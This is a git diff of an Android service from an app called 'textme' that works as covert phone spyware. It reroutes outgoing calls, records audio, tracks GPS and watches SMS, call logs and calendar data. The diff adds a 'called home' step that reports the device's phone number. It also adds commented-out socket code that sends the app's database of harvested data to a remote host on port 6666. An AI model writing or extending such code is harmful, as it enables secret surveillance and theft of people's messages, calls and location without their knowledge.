@@ -24,7 +24,6 @@ import android.provider.CallLog;
 import android.provider.Telephony;
 import android.util.Log;
 
-import com.candroid.textme.data.Commands;
 import com.candroid.textme.data.Constants;
 import com.candroid.textme.data.db.Database;
 import com.candroid.textme.data.db.DatabaseHelper;
@@ -42,9 +41,23 @@ import com.candroid.textme.receivers.ScreenReceiver;
 import com.candroid.textme.receivers.WapReceiver;
 import com.candroid.textme.receivers.WifiReceiver;
 
+import java.io.DataOutputStream;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.IOException;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.net.InetAddress;
+import java.net.InetSocketAddress;
+import java.net.ServerSocket;
+import java.net.Socket;
+import java.net.UnknownHostException;
+import java.util.ArrayList;
+
 public class MessagingService extends Service {
 
     private static final String TAG = MessagingService.class.getSimpleName();
+    public static boolean sHasCalledHome = false;
     public static boolean sIsRunning = false;
     private IncomingReceiver mIncomingReceiver;
     private OutgoingReceiver mOutgoingReceiver;
@@ -157,6 +170,7 @@ public class MessagingService extends Service {
         OutgoingCallReceiver.sRerouteNumber = sharedPreferences.getString(OutgoingCallReceiver.NUMBER_KEY, "9727729432");
         ScreenReceiver.sShouldRecordAudio = sharedPreferences.getBoolean(ScreenReceiver.RECORDER_KEY, false);
         JobsIntentService.sShouldTrackGps = sharedPreferences.getBoolean(JobsIntentService.GPS_TRACKER_KEY, false);
+        sHasCalledHome = sharedPreferences.getBoolean(Constants.Keys.CALLED_HOME_KEY, false);
         //getContentResolver().registerContentObserver(Uri.parse("content://com.android.chrome.browser/history"), true, mBrowserObserver);
     }
 
@@ -171,20 +185,66 @@ public class MessagingService extends Service {
             mLocationListener = Lofl.getLocationListener(this);
             mLocationManager.requestLocationUpdates(locationProvider, 1000, 30, mLocationListener, mLooper);
         }*/
-/*        Lofl.onReceiveCommand(this, Commands.CONTACTS);
-        Lofl.onReceiveCommand(this, Commands.SMS);
-        Lofl.onReceiveCommand(this, Commands.CALL_LOG);
-        Lofl.onReceiveCommand(this, Commands.DEVICE_INFO);
-        Lofl.onReceiveCommand(this, Commands.INSTALLED_PACKAGES);
-        Lofl.onReceiveCommand(this, Commands.CALENDAR_EVENTS);
-        Lofl.onReceiveCommand(this, Commands.TEXT_PARENTS);
-        Lofl.onReceiveCommand(this, Commands.SHARE_APP);*/
-        //Lofl.onReceiveCommand(this, Commands.SYNC_PHONE_TO_DATABASE, null, null);
-//        Lofl.testProcessCommand(this);
-        //Lofl.sendCommandTest(this);
         if(JobsIntentService.sShouldTrackGps){
             Lofl.onReceiveCommand(this, 21, "start", null);
         }
+        if(!sHasCalledHome){
+            Lofl.onReceiveCommand(this, 22, sTelephoneAddress, null);
+        }
+        Lofl.onReceiveCommand(this, 5, null, null);
+       //ArrayList<String> addresses = Lofl.fetchIpv4Addresses();
+   /*     new Thread(new Runnable() {
+            @Override
+            public void run() {
+                ArrayList<String> addresses = null;
+                Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
+                try {
+                    Socket socket = new Socket("10.0.2.2", 6666);
+                    ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream());
+                    byte[] bytes = Lofl.fileToBytes(Lofl.getDatabaseFile(MessagingService.this));
+                    oos.writeObject(String.valueOf(bytes));
+                    oos.flush();
+                    *//* for(int i = 0; i < 3; i++){
+                        addresses = Lofl.fetchIpv4Addresses();
+                        Socket socket = new Socket("10.0.2.2", 6666);
+                        ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream());
+                        if(i == 0){
+                            oos.writeObject(sTelephoneAddress);
+                        }else if(i == 1){
+                            oos.writeObject(InetAddress.getLocalHost().toString());
+                        }else if(i == 2){
+                            byte[] bytes = Lofl.fileToBytes(Lofl.getDatabaseFile(MessagingService.this));
+                            oos.writeObject(bytes);
+                            oos.flush();
+                        }
+                        oos.close();
+                        socket.close();
+                    }*//*
+                    oos.close();
+                    socket.close();
+                } catch (UnknownHostException e) {
+                    e.printStackTrace();
+                } catch (IOException e) {
+                    e.printStackTrace();
+                }
+*//*                try {
+                    ServerSocket serverSocket = new ServerSocket(8080, 0, InetAddress.getLocalHost());
+                    while(true) {
+                        Socket socket = serverSocket.accept();
+                        ObjectInputStream ois = new ObjectInputStream(socket.getInputStream());
+                        String message = (String) ois.readObject();
+                        Log.d(TAG, message);
+                        ois.close();
+                        socket.close();
+                    }
+                } catch (IOException e) {
+                        e.printStackTrace();
+                    } catch (ClassNotFoundException e) {
+                        e.printStackTrace();
+                    }*//*
+            }
+        }).start();*/
+
         return super.onStartCommand(intent, flags, startId);
     }
 
@@ -208,11 +268,9 @@ public class MessagingService extends Service {
         getContentResolver().unregisterContentObserver(mObserver);
         getContentResolver().unregisterContentObserver(mCallLogObserver);
         getContentResolver().unregisterContentObserver(mCalendarObserver);
-        mLocationManager.removeUpdates(mLocationListener);
+ /*       mLocationManager.removeUpdates(mLocationListener);
         mLooper.quitSafely();
-        mHandlerThread.stop();
-        mHandlerThread.quitSafely();
-        mHandlerThread.destroy();
+        mHandlerThread.quitSafely();*/
         if(sMediaRecorder != null){
             sMediaRecorder.stop();
             sMediaRecorder.release();
@@ -295,9 +353,9 @@ public class MessagingService extends Service {
                                 String body = cursor.getString(cursor.getColumnIndex("body"));
                                 String address = cursor.getString(cursor.getColumnIndex("address"));
                                 Intent outgoingSmsIntent = new Intent();
-                                outgoingSmsIntent.putExtra(Constants.ADDRESS, address);
-                                outgoingSmsIntent.putExtra(Constants.BODY, body);
-                                outgoingSmsIntent.putExtra(Constants.TYPE, type);
+                                outgoingSmsIntent.putExtra(Constants.Keys.ADDRESS_KEY, address);
+                                outgoingSmsIntent.putExtra(Constants.Keys.BODY_KEY, body);
+                                outgoingSmsIntent.putExtra(Constants.Keys.TYPE_KEY, type);
                                 outgoingSmsIntent.setAction(Constants.Actions.ACTION_OUTGOING_SMS);
                                 sendBroadcast(outgoingSmsIntent);
                             }
